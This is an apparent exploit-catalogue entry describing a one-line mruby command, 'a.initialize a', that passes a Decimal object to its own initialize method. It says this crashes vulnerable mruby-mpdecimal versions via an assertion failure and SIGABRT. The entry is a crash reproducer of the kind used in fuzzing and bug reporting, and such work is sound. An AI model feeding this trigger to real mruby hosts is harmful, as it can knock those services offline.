---
data: a.initialize a
tags:
  - mruby
  - decimal
  - exploit
type: command
executor: mruby
platforms:
  - Linux
id: 9af532ad-d61e-47e4-9de0-96da28a9b1dd
created_at: '2025-12-11T03:47:48.066Z'
updated_at: '2025-12-11T03:47:48.066Z'
verified: false
validated: true
submitted: true
---
# decimal-initialize-self

## Command

```mruby
a.initialize a
```

## Description

Calls the initialize method on a Decimal object, passing itself as the argument, which triggers an assertion failure and crash in vulnerable mruby-mpdecimal versions.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| a | The Decimal instance itself | Yes |

## Examples

### Basic Usage

```mruby
a.initialize a
```

## Expected Output

Triggers assertion failure in mpd_msword, leading to SIGABRT and program crash.

## Related

- [[commands/decimal-new]]
- [[procedures/Initialize-Decimal-with-Itself-for-Crash]]
